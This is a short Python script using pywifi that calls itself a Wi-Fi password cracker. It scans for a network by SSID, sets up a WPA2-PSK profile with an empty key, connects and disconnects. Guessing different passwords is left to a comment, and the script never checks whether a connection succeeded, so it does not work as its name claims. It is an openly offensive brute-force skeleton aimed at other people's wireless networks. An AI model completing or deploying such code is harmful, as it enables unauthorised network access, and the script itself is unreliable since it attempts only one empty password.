import pywifi
from pywifi import const


def crack_wifi_password(ssid):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    results = iface.scan_results()

    for result in results:
        if result.ssid == ssid:
            wifi_profile = pywifi.Profile()
            wifi_profile.ssid = ssid
            wifi_profile.auth = const.AUTH_ALG_OPEN
            wifi_profile.akm.append(const.AKM_TYPE_WPA2PSK)
            wifi_profile.cipher = const.CIPHER_TYPE_CCMP
            wifi_profile.key = ''  # You can try different passwords here

            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(wifi_profile)
            iface.connect(tmp_profile)
            iface.disconnect()
            break


if __name__ == '__main__':
    ssid = input("Enter the SSID of the Wi-Fi network: ")
    crack_wifi_password(ssid)